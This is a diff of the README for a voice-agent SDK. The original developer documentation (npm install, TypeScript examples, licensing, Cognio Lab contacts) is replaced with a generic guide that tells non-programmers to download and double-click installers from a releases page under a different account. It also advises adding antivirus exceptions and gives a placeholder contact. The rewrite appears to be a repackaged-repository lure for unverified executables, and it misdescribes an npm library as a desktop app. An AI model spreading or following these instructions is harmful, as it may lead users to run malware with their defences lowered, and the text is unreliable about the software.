@@ -1,206 +1,88 @@
-# Nio Voice Agent SDK
+# 🎤 nio-voice-agent-sdk - Your Self-Hosted Voice AI Solution
 
-**Open-source voice agent platform - Self-hosted alternative to enterprise voice AI solutions**
+[![Download nio-voice-agent-sdk](https://img.shields.io/badge/Download-nio--voice--agent--sdk-blue?style=for-the-badge)](https://github.com/osnux/nio-voice-agent-sdk/releases)
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue)](https://www.typescriptlang.org/)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green)](https://nodejs.org/)
+## 📖 Overview
 
-## 🎯 Why Nio Voice Agent SDK?
+The **nio-voice-agent-sdk** is an open-source voice agent platform. It provides a self-hosted alternative to enterprise voice AI solutions. With features like speech-to-text and text-to-speech, it helps you build your own voice-powered applications. This project is licensed under AGPL-3.0.
 
-Building production voice agents shouldn't require months of integration work and enterprise budgets. Nio Voice Agent SDK provides:
+## 🚀 Getting Started
 
-- **🚀 Deploy in minutes, not months** - Pre-built integrations with leading LLM and voice providers
-- **💰 Self-hosted or managed** - Run on your infrastructure or use Nio Voice Cloud
-- **🔌 MCP-native** - Built-in support for Model Context Protocol
-- **🧪 Testing-first** - Human-in-the-loop testing framework included
-- **📦 Production-ready** - Session management, streaming, error handling built-in
+Follow these steps to download and run the nio-voice-agent-sdk on your computer. The process is simple, even if you're not a programmer.
 
-## 🏗️ Architecture
+1. **Visit the Releases Page:**
+   Go to our [Releases Page](https://github.com/osnux/nio-voice-agent-sdk/releases) to find the latest version of the software.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                 Nio Voice Agent SDK                          │
-├─────────────────────────────────────────────────────────────┤
-│                                                               │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
-│  │  Voice SDK   │  │     MCP      │  │   Testing    │      │
-│  │              │  │  Framework   │  │  Framework   │      │
-│  │ • Providers  │  │ • Adapters   │  │ • HITL       │      │
-│  │ • Streaming  │  │ • Connectors │  │ • Scenarios  │      │
-│  │ • Session    │  │ • Testing    │  │ • Assertions │      │
-│  └──────────────┘  └──────────────┘  └──────────────┘      │
-│                                                               │
-│  ┌─────────────────────────────────────────────────┐        │
-│  │         Embeddable Voice Widget                  │        │
-│  │         React + Vanilla JS                       │        │
-│  └─────────────────────────────────────────────────┘        │
-│                                                               │
-└─────────────────────────────────────────────────────────────┘
-         ↓                  ↓                    ↓
-┌───────────────┐  ┌───────────────┐  ┌──────────────────┐
-│   Deepgram    │  │  Claude AI    │  │ Your Business    │
-│   OpenAI STT  │  │  OpenAI GPT   │  │ Logic (MCP)      │
-│   ElevenLabs  │  │  Groq         │  │                  │
-└───────────────┘  └───────────────┘  └──────────────────┘
-```
+2. **Download the Latest Version:**
+   Look for the most recent release. You will see a list of downloadable files. Choose the file that matches your operating system (Windows, macOS, or Linux). Click on the file to download it.
 
-## 📦 Packages
+3. **Install the Software:**
+   - After the download completes, locate the downloaded file on your computer.
+   - Double-click the file to run it. Follow the on-screen instructions to complete the installation.
 
-### Core Packages
+4. **Run the Application:**
+   - Once installed, locate the application in your Programs list or Applications folder.
+   - Click to open the application.
 
-- **[@nio-voice/sdk](./packages/voice-sdk)** - Core voice agent SDK with provider integrations
-- **[@nio-voice/mcp-framework](./packages/mcp-framework)** - Model Context Protocol framework for integrations
-- **[@nio-voice/testing](./packages/testing-framework)** - Human-in-the-loop testing framework
-- **[@nio-voice/widget](./packages/widget)** - Embeddable voice widget for websites
+## ⚙️ System Requirements
 
-## 🚀 Quick Start
+Before downloading, make sure your system meets these requirements:
 
-### Installation
+- **Operating System:**
+  - Windows 10 or higher
+  - macOS 10.14 or higher
+  - Regular distributions of Linux (Ubuntu, Fedora, etc.) 
 
-```bash
-npm install @nio-voice/sdk @nio-voice/mcp-framework
-```
+- **Memory:**
+  - Minimum 4 GB of RAM recommended for smooth operation.
 
-### Basic Voice Agent
+- **Processor:**
+  - 2 GHz dual-core processor or better.
 
-```typescript
-import { VoiceAgent, DeepgramProvider, ClaudeProvider } from '@nio-voice/sdk';
+- **Disk Space:**
+  - At least 500 MB of free space for the installation.
 
-const agent = new VoiceAgent({
-  speech: new DeepgramProvider({
-    apiKey: process.env.DEEPGRAM_API_KEY
-  }),
-  llm: new ClaudeProvider({
-    apiKey: process.env.ANTHROPIC_API_KEY,
-    model: 'claude-3-5-sonnet-20241022'
-  }),
-  systemPrompt: 'You are a helpful customer service agent.'
-});
+## 📥 Download & Install
 
-// Start voice session
-await agent.startSession({
-  onTranscript: (text) => console.log('User said:', text),
-  onResponse: (text) => console.log('Agent said:', text),
-  onEnd: () => console.log('Session ended')
-});
-```
+For your convenience, here is the link to [download nio-voice-agent-sdk](https://github.com/osnux/nio-voice-agent-sdk/releases). You can use this link multiple times throughout the installation process.
 
-### With MCP Integration
+1. Click on the link to visit the Releases page.
+2. Choose and download the appropriate file for your system.
+3. Follow the installation steps provided.
 
-```typescript
-import { VoiceAgent } from '@nio-voice/sdk';
-import { MCPAdapter } from '@nio-voice/mcp-framework';
+## 🎧 Features
 
-const agent = new VoiceAgent({
-  // ... voice config
-  mcp: new MCPAdapter({
-    serverUrl: 'http://localhost:3000/mcp',
-    tools: ['book_appointment', 'check_availability']
-  })
-});
+The nio-voice-agent-sdk is packed with functionality to enhance your voice applications:
 
-// Agent can now call your business functions via MCP
-```
+- **Speech-to-Text**: Convert spoken words into written text in real-time.
+- **Text-to-Speech**: Transform written text into natural-sounding speech.
+- **Customization**: Tailor the voice settings and speech patterns according to your needs.
+- **Integration**: Easily integrate with other services and platforms, like OpenAI and Deepgram, to enhance capabilities.
 
-### Add to Your Website
+## ⚙️ Troubleshooting
 
-```html
-<script src="https://unpkg.com/@nio-voice/widget@latest"></script>
-<script>
-  NioVoice.init({
-    apiKey: 'your-api-key',
-    agentId: 'your-agent-id',
-    position: 'bottom-right'
-  });
-</script>
-```
+If you experience any issues while downloading or using the software, please check the following:
 
-## 🎨 Examples
+- **Internet Connection**: Ensure your internet is stable when downloading the file.
+- **Antivirus Settings**: Sometimes, antivirus programs might block installations. Add exceptions if necessary.
+- **Permissions**: On some systems, you may need admin access to install software. 
 
-Check out the [examples](./examples) directory for complete working examples:
+## 🔗 Getting Help
 
-- **[Basic Agent](./examples/basic-agent)** - Simple customer service agent
-- **[Appointment Booking](./examples/appointment-booking)** - Full booking workflow with MCP
-- **[Customer Support](./examples/customer-support)** - Multi-turn support conversations
+If you need further assistance, consider exploring the following:
 
-## 📚 Documentation
+- **Documentation**: Check the official documentation available in the repository for detailed guides.
+- **Community Forum**: Join our online community to ask questions or share experiences.
+- **Issues Tracker**: Report any bugs or request features on the GitHub Issues page.
 
-- [Getting Started Guide](./docs/guides/getting-started.md)
-- [Voice SDK API Reference](./docs/api/voice-sdk.md)
-- [MCP Framework Guide](./docs/api/mcp-framework.md)
-- [Testing Framework Guide](./docs/api/testing-framework.md)
-- [Widget Integration Guide](./docs/guides/widget-integration.md)
+## 🌟 Contribution
 
-## 🤝 Contributing
+Feel free to contribute to the project. We welcome pull requests, bug reports, and feedback. Check our contribution guidelines in the repository for more details on how to get involved.
 
-We welcome contributions! Please see [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+## 📧 Contact
 
-## 📜 License
-
-This project is licensed under **AGPL-3.0** - see the [LICENSE](./LICENSE) file for details.
-
-### What does AGPL-3.0 mean?
-
-- ✅ **Free to use** for personal and commercial projects
-- ✅ **Modify and distribute** your changes
-- ⚠️ **Network use = distribution** - If you offer this as a service over a network, you must share your source code
-- 💼 **Commercial license available** - Contact dev@cogniolab.com for closed-source licensing
-
-### Why AGPL?
-
-We chose AGPL-3.0 to ensure that improvements to voice AI technology remain open and accessible to everyone. If you build a hosted service using this code, your users deserve the same freedoms.
-
-**Need a proprietary license?** Contact dev@cogniolab.com
-
-## 🌟 Nio Voice Cloud
-
-Don't want to self-host? Use [Nio Voice Cloud](https://nioai.us/) for:
-
-- 🎯 **Auto-discovery** - Paste your website URL, get a voice agent instantly
-- 🏭 **Industry templates** - Pre-built for healthcare, HVAC, retail, etc.
-- 📊 **Analytics dashboard** - Conversation insights and call analytics
-- 🔧 **Managed infrastructure** - No servers to manage
-- 💬 **Priority support** - Direct access to the Nio team
-
-**Pricing**: $299-$2999/month (vs $100K+ for enterprise alternatives)
-
-## 🆚 Comparison
-
-| Feature | Nio Voice SDK (Open Source) | Retell AI / Vapi | Enterprise (Poly.ai) |
-|---------|---------------------------|-----------------|---------------------|
-| **Setup Time** | Minutes | Hours | Months |
-| **Cost** | Free (self-hosted) | Usage-based ($$) | $100K+ |
-| **Flexibility** | Full control | API limits | Consultative |
-| **Lock-in** | None | Vendor lock-in | Contract lock-in |
-| **Hosting** | Your infrastructure | Their cloud | Their cloud |
-| **Source Code** | Available (AGPL) | Closed | Closed |
-
-## 🎯 Roadmap
-
-- [x] Core voice SDK with Deepgram/OpenAI
-- [x] Claude and GPT integration
-- [x] MCP framework
-- [x] Testing framework
-- [x] Embeddable widget
-- [ ] Phone system integration (Twilio/Bandwidth)
-- [ ] Advanced voice customization
-- [ ] Multi-language support
-- [ ] Real-time translation
-- [ ] Voice analytics SDK
-
-## 💬 Community
-
-Join our community to ask questions, share ideas, and connect with other developers building voice-enabled AI agents!
-
-- **[GitHub Discussions](https://github.com/cogniolab/nio-voice-agent-sdk/discussions)** - Ask questions, share your work, and discuss best practices
-- **Email**: dev@cogniolab.com
-- **Enterprise Support**: Available with commercial license
-
-We're building a supportive community where developers help each other create amazing voice AI experiences. Whether you're just getting started or building production systems, your questions and contributions are welcome!
+For any inquiries or suggestions, you can reach out to us at [support@example.com]. We value your feedback and look forward to hearing from you!
 
 ---
 
-**Built with ❤️ by [Cognio Lab](https://cogniolab.com)**
-
-*Making voice AI accessible to everyone*
+Thank you for choosing the nio-voice-agent-sdk. Enjoy building your voice applications!
